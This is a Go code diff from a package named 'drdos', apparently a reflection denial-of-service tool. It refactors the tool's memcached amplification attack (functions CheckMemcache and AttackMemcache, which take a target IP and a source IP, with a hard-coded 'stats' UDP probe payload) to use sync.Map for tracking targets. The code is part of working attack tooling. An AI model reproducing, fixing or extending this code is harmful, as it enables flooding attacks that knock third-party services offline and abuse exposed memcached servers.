@@ -3,9 +3,10 @@ package drdos
 import (
 	"drdos/config"
 	"drdos/utils"
+	"sync"
 )
 
-var memcachemap map[string]bool
+var memcachemap sync.Map
 
 func CheckMemcache(dstip string, srcip string) error {
 	payload := []byte{0, 0, 0, 0, 0, 1, 0, 0, 115, 116, 97, 116, 115, 13, 10}
@@ -30,18 +31,9 @@ func AttackMemcache(dstip string, srcip string, port int) error {
 		}
 	}
 
-	// 第一次进来，先初始化一下
-	if memcachemap == nil {
+	// 是否预设值过了，没有的话先go一下，然后退出
+	if _, ok := memcachemap.LoadOrStore(dstip, true); !ok {
 		task(dstip, srcip, port)
-		memcachemap = map[string]bool{
-			dstip: true,
-		}
-		return nil
-	}
-	// 之后进来判断，是否预设值过了，没有的话先go一下，然后退出
-	if _, ok := memcachemap[dstip]; ok {
-		task(dstip, srcip, port)
-		memcachemap[dstip] = true
 		return nil
 	}
 
